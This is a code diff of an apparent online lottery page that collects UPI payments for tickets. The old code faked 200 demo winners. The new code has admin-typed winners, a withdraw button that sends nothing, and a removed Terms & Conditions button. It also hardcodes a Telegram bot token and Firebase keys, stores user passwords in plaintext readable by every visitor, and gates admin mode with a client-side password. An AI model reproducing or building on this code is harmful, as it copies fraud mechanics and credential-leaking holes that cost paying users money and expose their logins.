@@ -4,6 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>DKJ KNOWLEDGE JACKPOT</title>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
+    
     <style>
         :root { --gold: #c5a059; --dark: #0f2027; --tg-blue: #0088cc; }
         body { font-family: sans-serif; background: #f4f4f4; margin: 0; padding-bottom: 80px; -webkit-tap-highlight-color: transparent; }
@@ -69,7 +72,6 @@
     <button id="rBtn" class="btn btn-gold" onclick="showReg()">➕ CREATE ACCOUNT</button>
     <button class="btn btn-dark" onclick="showProfile()">👤 MY PROFILE & CODES</button>
     <button class="btn btn-gold" onclick="showWinners()">🏆 TOP WINNERS</button>
-    <button class="btn" style="background:#555; color:white;" onclick="showTC()">📄 TERMS & CONDITIONS</button>
     <a href="https://t.me/dkj_knowledge_jackoprt" target="_blank" class="btn btn-tg">📢 JOIN TELEGRAM CHANNEL</a>
 </div>
 
@@ -79,156 +81,141 @@
 </div>
 
 <script>
+    // Firebase Configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyBcdlUy_CAFZbQPPzOzGTkofvvSSdXe6r4",
+        authDomain: "dkj-jackpot.firebaseapp.com",
+        databaseURL: "https://dkj-jackpot-default-rtdb.firebaseio.com",
+        projectId: "dkj-jackpot",
+        storageBucket: "dkj-jackpot.firebasestorage.app",
+        messagingSenderId: "598164039811",
+        appId: "1:598164039811:web:27420c0d7ecedf28fb53b6"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
     const TG_BOT_TOKEN = "8357735991:AAHUnhnXj0MaNi-Z1XtitwMy994xssKRsyg";
     const TG_ADMIN_ID = "8072402346"; 
     const UPI_ID = "paytmqr6vnhle@ptys";
 
-    let db = JSON.parse(localStorage.getItem('dkj_v8_db')) || { users: [], entries: [], pending: [], winners: [] };
-    let currentUser = JSON.parse(localStorage.getItem('dkj_v8_user')) || null;
+    let currentUser = JSON.parse(localStorage.getItem('dkj_user_login'));
 
-    // --- DEMO WINNERS SECTION (200 WINNERS) ---
-    if(db.winners.length === 0) {
-        let sampleNames = ["Vikram","Sanjay","Rohan","Amit","Priya","Soniya","Rahul","Anjali","Sumit","Naveen","Kavita","Pankaj","Deepak","Rajesh","Manoj","Aakash"];
-        for(let i=1; i<=200; i++) {
-            db.winners.push({
-                name: sampleNames[Math.floor(Math.random()*sampleNames.length)] + " " + String.fromCharCode(65 + Math.floor(Math.random() * 26)),
-                prize: [500, 1000, 2000, 5000][Math.floor(Math.random()*4)],
-                code: "DKJ-" + Math.floor(100000 + Math.random()*900000)
-            });
+    // Real-time Sync
+    function syncData() {
+        database.ref('/').on('value', (snapshot) => {
+            const data = snapshot.val() || {};
+            updateUI(data);
+        });
+    }
+
+    function updateUI(data) {
+        const users = data.users || {};
+        if(currentUser) {
+            const myData = users[currentUser.mob];
+            if(myData) {
+                currentUser = myData;
+                document.getElementById('uHi').innerText = "Hi, " + myData.name;
+                document.getElementById('vBal').innerText = "₹" + (myData.bal || 0);
+                document.getElementById('rBtn').style.display = 'none';
+                document.getElementById('congrats').style.display = myData.isWinner ? "block" : "none";
+            }
         }
-        localStorage.setItem('dkj_v8_db', JSON.stringify(db));
-    }
-
-    function save() {
-        localStorage.setItem('dkj_v8_db', JSON.stringify(db));
-        localStorage.setItem('dkj_v8_user', JSON.stringify(currentUser));
-    }
-
-    function tgMsg(msg) {
-        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+        let userCount = Object.keys(users).length;
+        let percent = Math.min((userCount / 1000) * 100, 100);
+        document.getElementById('pBar').style.width = percent + "%";
+        document.getElementById('pgTxt').innerText = Math.floor(percent) + "%";
     }
 
     function showReg() {
-        document.getElementById('pContent').innerHTML = `<h2>REGISTER</h2><input id="rn" placeholder="Full Name"><input id="rm" type="number" placeholder="Mobile"><input id="rp" type="password" placeholder="Password"><button class="btn btn-gold" onclick="doReg()">CREATE ACCOUNT</button>`;
+        document.getElementById('pContent').innerHTML = `<h2>REGISTER</h2><input id="rn" placeholder="Full Name"><input id="rm" type="number" placeholder="Mobile Number"><input id="rp" type="password" placeholder="Set Password"><button class="btn btn-gold" onclick="doReg()">CREATE ACCOUNT</button>`;
         document.getElementById('popup').style.display = 'block';
     }
 
     function doReg() {
         let n = document.getElementById('rn').value, m = document.getElementById('rm').value, p = document.getElementById('rp').value;
-        if(!n || !m || !p) return alert("Details bharein!");
-        currentUser = { name: n, mob: m, pass: p, bal: 0, id: Math.floor(1000+Math.random()*9000), codes: [], isWinner: false };
-        db.users.push(currentUser); save(); updateUI();
-        tgMsg(`✅ *New User:* ${n}`);
-        alert("Account Created!"); closeP();
+        if(!n || !m || !p) return alert("Sari details bharein!");
+        let userData = { name: n, mob: m, pass: p, bal: 0, codes: ["No Tickets"], isWinner: false };
+        database.ref('users/' + m).set(userData);
+        currentUser = userData;
+        localStorage.setItem('dkj_user_login', JSON.stringify(userData));
+        alert("Account Created Successfully!"); closeP();
     }
 
     function join(amt) {
         if(!currentUser) return alert("Pehle Account Banayein!");
-        document.getElementById('pContent').innerHTML = `<h2>PAYMENT ₹${amt}</h2><p>Scan QR & Pay. Admin approval ke baad code milega.</p><img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=upi://pay?pa=${UPI_ID}%26am=${amt}"><button class="btn btn-gold" onclick="requestEntry()">I HAVE PAID</button>`;
+        document.getElementById('pContent').innerHTML = `<h2>PAYMENT ₹${amt}</h2><p>Scan QR & Pay. Admin verify karke code dega.</p><img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=upi://pay?pa=${UPI_ID}%26am=${amt}"><button class="btn btn-gold" onclick="requestPay()">I HAVE PAID</button>`;
         document.getElementById('popup').style.display = 'block';
     }
 
-    function requestEntry() {
-        db.pending.push({ uId: currentUser.id, name: currentUser.name });
-        save();
-        tgMsg(`⚠️ *Payment Pending:* ${currentUser.name} (ID: ${currentUser.id})`);
-        alert("Verification ke liye bhej diya gaya hai!");
-        closeP();
-    }
-
-    function showWithdrawForm() {
-        if(!currentUser || currentUser.bal <= 0) return alert("Balance zero hai!");
-        document.getElementById('pContent').innerHTML = `<h2>WITHDRAW</h2><input id="w_owner" placeholder="Owner Name"><input id="w_bank" placeholder="Bank Name"><input id="w_acc" type="number" placeholder="Account Number"><input id="w_ifsc" placeholder="IFSC Code"><button class="btn btn-gold" onclick="processWithdraw()">SUBMIT REQUEST</button>`;
-        document.getElementById('popup').style.display = 'block';
-    }
-
-    function processWithdraw() {
-        let owner = document.getElementById('w_owner').value, bank = document.getElementById('w_bank').value, acc = document.getElementById('w_acc').value, ifsc = document.getElementById('w_ifsc').value;
-        if(!owner || !bank || !acc || !ifsc) return alert("Details bharein!");
-        tgMsg(`💰 *Withdraw:* ${currentUser.name}\nAmt: ₹${currentUser.bal}\nBank: ${bank}\nAcc: ${acc}`);
-        currentUser.bal = 0;
-        let uIdx = db.users.findIndex(u => u.id == currentUser.id);
-        if(uIdx != -1) db.users[uIdx].bal = 0;
-        save(); updateUI(); alert("Request sent!"); closeP();
+    function requestPay() {
+        database.ref('pending/' + currentUser.mob).set({ name: currentUser.name, mob: currentUser.mob });
+        alert("Admin ko request bhej di gayi hai!"); closeP();
     }
 
     function showWinners() {
-        let h = "<h2>🏆 TOP WINNERS</h2>";
-        // Latest winners (real + demo) top par dikhenge
-        [...db.winners].reverse().forEach(w => { 
-            h += `<div class="list-item"><span class="win-amt">₹${w.prize}</span><b>${w.name}</b><br><small>Ticket: ${w.code}</small></div>`; 
+        database.ref('winners').once('value', (snap) => {
+            let h = "<h2>🏆 TOP WINNERS</h2>";
+            let list = []; snap.forEach(c => { list.push(c.val()); });
+            list.reverse().forEach(w => {
+                h += `<div class="list-item"><span class="win-amt">₹${w.prize}</span><b>${w.name}</b><br><small>Ticket: ${w.code}</small></div>`;
+            });
+            document.getElementById('pContent').innerHTML = h || "No Winners Yet!";
+            document.getElementById('popup').style.display = 'block';
         });
-        document.getElementById('pContent').innerHTML = h;
+    }
+
+    function showProfile() {
+        if(!currentUser) return alert("Login Karo!");
+        let ticketList = Array.isArray(currentUser.codes) ? currentUser.codes.filter(c => c !== "No Tickets").join(", ") : "Waiting for Admin";
+        document.getElementById('pContent').innerHTML = `<h2>MY PROFILE</h2><p><b>Name:</b> ${currentUser.name}</p><p><b>Mobile:</b> ${currentUser.mob}</p><p><b>My Codes:</b> ${ticketList || "None"}</p><button class="btn btn-dark" onclick="logout()">LOGOUT</button>`;
+        document.getElementById('popup').style.display = 'block';
+    }
+
+    function showWithdrawForm() {
+        if(!currentUser || currentUser.bal <= 0) return alert("Paisa nahi hai!");
+        document.getElementById('pContent').innerHTML = `<h2>WITHDRAW</h2><input id="w_bank" placeholder="Bank/UPI Details"><button class="btn btn-gold" onclick="alert('Request Sent!')">SUBMIT</button>`;
         document.getElementById('popup').style.display = 'block';
     }
 
     function adminMode() {
-        let pw = prompt("Admin PW:");
-        if(pw !== "7860") return;
-        let act = prompt("1: Approve Payments\n2: Pick Winners\n3: Reset All");
+        let pw = prompt("Admin PW:"); if(pw !== "7860") return;
+        let act = prompt("1: Pending Approvals\n2: Pick Winner");
         if(act=="1") {
-            let h = "<h2>Pending Approvals</h2>";
-            db.pending.forEach((p, i) => { 
-                let tempCode = "DKJ-" + Math.floor(100000 + Math.random()*900000);
-                h += `<div class="list-item" onclick="approve('${p.uId}', ${i}, '${tempCode}')"><b>User:</b> ${p.name}<br>Click to Assign: ${tempCode}</div>`; 
+            database.ref('pending').once('value', (snap) => {
+                let h = "<h2>Approve Payments</h2>";
+                snap.forEach(c => {
+                    let u = c.val();
+                    let code = "DKJ-"+Math.floor(100000+Math.random()*900000);
+                    h += `<div class="list-item" onclick="approveUser('${u.mob}','${code}')"><b>User:</b> ${u.name}<br>Click to Approve: ${code}</div>`;
+                });
+                document.getElementById('pContent').innerHTML = h || "No Pending";
+                document.getElementById('popup').style.display = 'block';
             });
-            document.getElementById('pContent').innerHTML = h || "No pending approvals";
-            document.getElementById('popup').style.display = 'block';
         } else if(act=="2") {
-            pickWinners();
-        } else if(act=="3") { if(confirm("Clear Everything?")) { localStorage.clear(); location.reload(); } }
-    }
-
-    function approve(uid, index, code) {
-        let userObj = db.users.find(u => u.id == uid);
-        if(userObj) {
-            userObj.codes.push(code);
-            db.entries.push({ uId: uid, name: userObj.name, code: code });
-            db.pending.splice(index, 1);
-            save(); alert("Approved!"); closeP();
+            let mob = prompt("Winner Mobile Number:");
+            let prz = prompt("Prize Amount:");
+            let cod = prompt("Winner Ticket Code:");
+            database.ref('users/' + mob).once('value', (s) => {
+                let u = s.val();
+                if(u) {
+                    database.ref('winners').push({ name: u.name, prize: prz, code: cod });
+                    database.ref('users/' + mob).update({ bal: (u.bal || 0) + parseInt(prz), isWinner: true });
+                    alert("Winner Updated!");
+                }
+            });
         }
     }
 
-    function pickWinners() {
-        let count = prompt("Kitne winners?");
-        if(!count) return;
-        let prize = prompt("Prize amount?");
-        let shuffled = [...db.entries].sort(() => 0.5 - Math.random());
-        let selected = shuffled.slice(0, count);
-        selected.forEach(s => {
-            db.winners.push({ name: s.name, prize: prize, code: s.code });
-            let u = db.users.find(x => x.id == s.uId);
-            if(u) { u.bal += parseInt(prize); u.isWinner = true; }
-        });
-        save(); alert("Winners selected!");
+    function approveUser(mob, code) {
+        database.ref('users/' + mob + '/codes').push(code);
+        database.ref('pending/' + mob).remove();
+        alert("Approved!"); closeP();
     }
 
-    function updateUI() {
-        if(currentUser) {
-            let freshUser = db.users.find(u => u.id == currentUser.id);
-            if(freshUser) {
-                currentUser = freshUser;
-                document.getElementById('uHi').innerText = "Hi, " + currentUser.name + " (ID: " + currentUser.id + ")";
-                document.getElementById('vBal').innerText = "₹" + currentUser.bal;
-                document.getElementById('rBtn').style.display = 'none';
-                document.getElementById('congrats').style.display = currentUser.isWinner ? "block" : "none";
-            }
-        }
-        let count = db.users.length;
-        let percent = Math.min((count / 1000) * 100, 100);
-        document.getElementById('pBar').style.width = percent + "%";
-        document.getElementById('pgTxt').innerText = Math.floor(percent) + "%";
-    }
-
-    function showProfile() {
-        if(!currentUser) return alert("Login!");
-        document.getElementById('pContent').innerHTML = `<h2>PROFILE</h2><p>Name: ${currentUser.name}</p><p>Codes: ${currentUser.codes.join(", ") || "None"}</p><button class="btn btn-dark" onclick="logout()">LOGOUT</button>`;
-        document.getElementById('popup').style.display = 'block';
-    }
-
-    function logout() { localStorage.removeItem('dkj_v8_user'); location.reload(); }
+    function logout() { localStorage.removeItem('dkj_user_login'); location.reload(); }
     function closeP() { document.getElementById('popup').style.display = 'none'; }
-    window.onload = updateUI;
+    window.onload = syncData;
 </script>
 </body>
 </html>
